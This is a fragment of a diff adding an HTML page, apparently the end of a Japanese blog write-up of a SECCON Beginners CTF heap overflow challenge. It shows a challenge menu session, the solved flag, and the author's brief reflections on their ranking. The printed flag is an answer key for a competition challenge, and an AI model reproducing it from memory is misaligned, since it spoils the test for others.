+3. free<span style="color:#f92672">(</span>B<span style="color:#f92672">)</span>; B <span style="color:#f92672">=</span> NULL;
+4. Describe heap
+5. Describe tcache <span style="color:#f92672">(</span><span style="color:#66d9ef">for</span> size 0x20<span style="color:#f92672">)</span>
+6. Currently available hint
+&gt; $ <span style="color:#ae81ff">3</span>
+Congratulations!
+ctf4b<span style="color:#f92672">{</span>l1bc_m4ll0c_h34p_0v3rfl0w_b4s1cs<span style="color:#f92672">}</span>
+</code></pre></div><h2 id="感想">感想</h2>
+<p>実は去年のSECCON Beginners CTFが初体験でした。</p>
+<p>その時は200位ぐらいだったので，成長できているようで良かったです。</p>
+<p>来年はより高順位を目指したいですね。</p>
+
+			</div>
+		</div>
+	</div>
+		<div class="links">
+			<a href="https://kuzushiki.github.io/">Home</a>
+			
+				<a href="https://kuzushiki.github.io/post/">Archive</a>
+			
+			
+				
+			
+				
+					<a href="https://kuzushiki.github.io/pages/resume/">Résumé</a>
+				
+			
+			<a href="#top">Top</a>
+		</div>
+		
+		
+		<p id="copyright">
+			© Copyright 2020 kuzushiki
+		</p>
+		
+	</body>
+</html>
+
